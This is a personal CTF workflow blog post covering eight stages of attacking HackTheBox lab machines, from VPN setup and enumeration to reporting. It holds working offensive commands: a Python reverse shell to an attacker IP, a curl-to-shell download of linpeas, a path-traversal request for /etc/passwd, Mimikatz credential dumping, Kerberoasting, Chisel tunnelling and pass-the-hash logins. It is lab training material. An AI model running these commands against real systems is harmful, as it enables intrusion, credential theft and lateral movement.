```json
{
  "title": "My CTF Workflow: From Setup to Report",
  "metaTitle": "My CTF Workflow: From Setup to Report",
  "metaDescription": "Eight stages for a CTF or HackTheBox lab, from scoping and recon through exploitation, pivoting, cleanup, and reporting.",
  "slug": "ctf-workflow",
  "openGraphImagePrompt": "A clean terminal-inspired editorial diagram for an eight-stage CTF workflow: scoping, setup, enumeration, foothold, exploitation, privilege escalation, pivoting, and reporting; charcoal background, restrained blue and teal accents, readable spacing, no logos or neon effects.",
  "tags": ["CTF", "HackTheBox", "Enumeration", "Privilege Escalation"],
  "keyTakeaway": "Eight stages, recon through report, for HackTheBox and local VM labs.",
  "summary": "How I primarily approach CTFs and Labs: Set up a workspace, enumerate deliberately, verify findings, record each step, and finish with a clear write-up. The stages below reflect my typical process rather than an exhaustive command list.",
  "author": "David Awosusi",
  "category": "CTF Workflow",
  "publishedAt": "2021-08-12",
  "visual": {
    "title": "Eight stages, recon through report",
    "caption": "The sequence from scoping and setup through enumeration, access, cleanup, and reporting.",
    "steps": [
      { "label": "1 · Scope", "detail": "Confirm target, VPN, and platform rules." },
      { "label": "2 · Setup", "detail": "Set variables, create folders, and log the session." },
      { "label": "3 · Enumerate", "detail": "Map ports, web paths, hostnames, and services." },
      { "label": "4 · Foothold", "detail": "Check a suspected weakness and verify the result." },
      { "label": "5 · Exploitation", "detail": "Get access and stabilize the connection." },
      { "label": "6 · Escalate", "detail": "Go from a limited account to full control." },
      { "label": "7 · Pivot", "detail": "Use the machine to reach deeper hosts." },
      { "label": "8 · Report", "detail": "Collect proof, clean up, and document the path." }
    ]
  },
  "schema": {
    "title": "Document the evidence at each breakthrough",
    "caption": "At each step forward, record what is tested, the command, the result, and how it was confirmed.",
    "joinLabel": "target → finding → report",
    "standards": [
      {
        "name": "Target notes",
        "fields": [
          { "name": "target", "meaning": "Challenge host or address" },
          { "name": "port_service", "meaning": "Open port and service" },
          { "name": "hostname", "meaning": "Virtual host or DNS name" },
          { "name": "evidence_path", "meaning": "Saved scan or request output" }
        ]
      },
      {
        "name": "Finding notes",
        "fields": [
          { "name": "hypothesis", "meaning": "What may be vulnerable" },
          { "name": "command", "meaning": "The test that was run" },
          { "name": "observed_result", "meaning": "Output that supports or rejects it" },
          { "name": "validation", "meaning": "How the finding was confirmed" }
        ]
      }
    ],
    "output": {
      "name": "Write-up section",
      "fields": ["recon", "foothold", "privesc", "flags", "cleanup"]
    }
  }
}
```

## The approach

I approach most boxes using the same eight stages in a streamlined process. Each stage sets up the next, and working in order makes the write-up easier at the end. This is my process, not a full command list.

## Stage 1: Getting connected

First the basics: a VPN session, the target box, and the wordlists I'll need. On HackTheBox I stay on my own instance.

I connect with the platform's VPN profile:

```bash
sudo openvpn lab_platform.ovpn
```

Or, if the platform hands out a WireGuard config instead:

```bash
sudo wg-quick up lab
```

HTB only permits publishing write-ups for retired machines, so I check a box has retired before writing one.

## Stage 2: Set up the workspace

I set the target address once, make a folder per output type, and record the terminal from the first command. Swap the example address for the one assigned to the box.

```bash
export IP=10.129.238.31
export BOX=variatype
mkdir -p ~/htb/$BOX/{scans,web,exploits,loot,creds}
cd ~/htb/$BOX
script -a engagement_log.txt
```

`script -a` records the full terminal session for the write-up; `exit` closes it. For a session I can detach and reattach, I run it inside tmux instead:

```bash
tmux new -s "$BOX"
```

## Stage 3: Enumeration

Enumeration maps what the target exposes. It's the stage that decides most boxes, so I spend the most time here.

### Ports

I scan all TCP ports first, then run version and default-script checks against only the ones that answered. Splitting it keeps the full sweep fast and limits the slow checks to the open services.

```bash
nmap -p- --min-rate 5000 -oN scans/all_ports.nmap "$IP"
```

Then, with the open ports in hand (replace `22,80` with what the first scan found):

```bash
PORTS=22,80
nmap -sC -sV -p "$PORTS" -oN scans/targeted.nmap "$IP"
```

UDP needs its own scan and is easy to skip, so I check the common ports:

```bash
nmap -sU --top-ports 20 -oN scans/udp_top20.nmap "$IP"
```

RustScan is an option for a faster first pass over a wide range. Either way, I resolve any hostname I find before moving on:

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

### Web hosts and paths

If a web server is open, I fingerprint it and browse it by hand before fuzzing. Page titles, redirects and login forms often point somewhere faster than a wordlist.

```bash
whatweb "http://$IP"
nikto -h "http://$IP"
```

Many boxes serve their real content only under the right hostname, so I add any name I find to `/etc/hosts`:

```bash
echo "$IP $BOX.htb" | sudo tee -a /etc/hosts
```

If more hostnames are likely, I fuzz for them. A server often returns the same default page for every wrong guess, so I get the baseline response size first and filter it out:

```bash
BASELINE_SIZE=$(curl -s -o /dev/null -w '%{size_download}' -H "Host: invalid.$BOX.htb" "http://$BOX.htb/")
ffuf -u "http://$BOX.htb/" -H "Host: FUZZ.$BOX.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs "$BASELINE_SIZE"
```

Then I check `robots.txt` and look for hidden directories and files on each host worth the time:

```bash
curl -s "http://$BOX.htb/robots.txt"
```

```bash
feroxbuster -u "http://$BOX.htb/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak -o web/portal-ferox.txt
```

I don't run several big wordlists at once. I start small, watch the status codes and response sizes, and widen the search only when a result points somewhere. The [ffuf guide](https://github.com/ffuf/ffuf) and [feroxbuster docs](https://epi052.github.io/feroxbuster-docs/) have the rest of the options.

If it's running WordPress or Drupal, their own scanners save time:

```bash
wpscan --url "http://$BOX.htb" --enumerate vp,vt,u
droopescan scan drupal -u "http://$BOX.htb"
```

An exposed `.git` folder is worth pulling down to read the commit history for credentials:

```bash
git-dumper "http://$BOX.htb/.git/" ./loot/repo
cd loot/repo && git log --all && gitleaks detect -v
```

### File shares and other services

For Windows file sharing (SMB), I check whether shares list without credentials:

```bash
smbclient -L "//$IP/" -N
smbmap -H "$IP"
enum4linux-ng -A "$IP"
nxc smb "$IP" --shares -u '' -p ''
```

`nxc` (NetExec) is the maintained successor to CrackMapExec. A no-credential "null session" sometimes returns share names or account lists.

A few other services are worth a look when the scans show them: SNMP (`snmpwalk -c public -v1 "$IP"`), anonymous FTP login, user enumeration over SMTP, and LDAP if the box is a domain controller, the server that runs a Windows network.

## Stage 4: Finding a foothold

I match what I found to a likely weakness and test it. A version number is a lead, not proof; plenty of "vulnerable" versions turn out patched.

```bash
searchsploit "apache 2.4.52"
```

If something looks right, I copy the exploit out by its ID (replace `12345` with the real one). I understand how it works and adapt it to the target rather than reinventing it:

```bash
EDB_ID=12345
searchsploit -m "$EDB_ID"
```

On a web app, a handful of quick checks cover most lab footholds:

- **Template injection** — the site runs my input through its own page templates. I put `{{7*7}}` in a field; if `49` comes back, it's evaluating the input. That's a strong hint, not proof of code execution.

```bash
curl -i "http://$IP/view?file=../../../../etc/passwd"
```

- **File inclusion** — making the app read files it shouldn't, like the one above. If it works, I follow up with the PHP wrappers (`php://filter/convert.base64-encode/resource=`).

- **SQL injection** — breaking out of a database query. A lone `'` to force an error, then sqlmap if it looks real:

```bash
URL='http://variatype.htb/item?id=1'
sqlmap -u "$URL" --batch
```

- **Upload forms** — I test how they filter by extension, content type, and the file's actual signature.

## Stage 5: Exploitation

I turn the weakness into access. I want the target to connect back to me (a "reverse" connection), so I start the listener first and point the callback at my lab interface.

```bash
nc -lvnp 4444
```

Then I set my VPN address and send the connection back:

```bash
export LHOST=10.10.14.3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.environ["LHOST"],4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

The first connection is basic: no arrow keys, no tab-complete, and Ctrl-C kills it. I upgrade it to a full interactive terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z` to drop back to my own terminal, then:

```bash
stty raw -echo; fg
```

Press `Enter`, then set the terminal type so screen-based tools display correctly:

```bash
export TERM=xterm
```

Or `pwncat-cs` as the listener handles the upgrade automatically:

```bash
pwncat-cs -lp 4444
```

## Stage 6: Privilege escalation

A normal user account is rarely the goal; I need full control, which is root on Linux and SYSTEM on Windows. I start with what the current account can already do, then check file permissions, scheduled jobs and stored credentials.

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*/
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

[LinPEAS](https://github.com/peass-ng/PEASS-ng) gathers most of the local evidence. I run pspy alongside it, since pspy catches scheduled jobs as they run, which LinPEAS can miss. For a command I can run as root or a program with special permissions, I check [GTFOBins](https://gtfobins.github.io/) for a known escalation before moving on.

### Windows and Active Directory

On Windows I start with my own privileges and the system details:

```powershell
whoami /priv
systeminfo
```

winPEAS, PowerUp and Seatbelt automate the local hunt. For the wider Windows network:

- **BloodHound** maps the shortest path from where I am to full control of the domain:

```powershell
SharpHound.exe -c All
```

- **Mimikatz** reads credentials out of memory once I have local admin:

```text
privilege::debug
sekurlsa::logonpasswords
```

- **Kerberoasting and AS-REP roasting** both pull crackable password material out of the Windows login system:

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip "$IP" -request
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip "$IP"
```

LOLBAS is the Windows counterpart to GTFOBins: trusted built-in programs that can be turned to other uses.

## Stage 7: Reaching further in

Some boxes keep the real target on a second machine the first one can reach but I can't. Pivoting uses the machine I control as a bridge to it.

The simplest case forwards one service from the target's internal side to my machine:

```bash
ssh -L 8080:127.0.0.1:80 "user@$IP"
```

With no SSH available, Chisel builds the tunnel:

```bash
./chisel server -p 8000 --reverse        # attacker
./chisel client 10.10.14.3:8000 R:socks # target
proxychains nmap -sT -Pn 10.10.10.0/24
```

Ligolo-ng is the newer option, and gives a real network interface instead of a proxy. With a working credential or password hash, I can often move to the next machine directly:

```bash
NTLM_HASH=0123456789abcdef0123456789abcdef
evil-winrm -i "$IP" -u Administrator -H "$NTLM_HASH"
impacket-psexec domain/user:pass@"$IP"
impacket-wmiexec domain/user:pass@"$IP"
```

## Stage 8: Proof, cleanup, and the write-up

I grab the proof and a few host details to anchor the write-up:

```bash
cat user.txt root.txt
hostname; id; whoami
```

Before I disconnect, I clean up: delete anything I uploaded (linpeas.sh, nc.exe, chisel), remove any users, keys or scheduled jobs I added, and restore files I changed.

Then I build the write-up from `engagement_log.txt` and my screenshots, in the order I worked, and note why each step worked, not just the command. That's what makes it useful to read later.

What goes in the finished write-up: the scope and service map, the evidence behind each step, the weakness that let me in, enough to reproduce it, the escalation path with flags blurred, and anything I changed on the box. The terminal log and scans stay on disk until it's done.

## Quick reference

| Stage | Goal | Primary tools |
| --- | --- | --- |
| 1. Connect | Get on the box | VPN client |
| 2. Setup | Workspace and logging | tmux, script |
| 3. Enumeration | Map the attack surface | nmap, feroxbuster/ffuf, enum4linux-ng, nxc |
| 4. Foothold | Find the way in | searchsploit, manual testing |
| 5. Exploitation | Get access | nc, pwncat-cs |
| 6. Privilege escalation | Root / SYSTEM | linpeas, winPEAS, BloodHound, Mimikatz |
| 7. Pivoting | Reach deeper hosts | chisel, ligolo-ng, evil-winrm |
| 8. Reporting | Document it | engagement_log.txt |
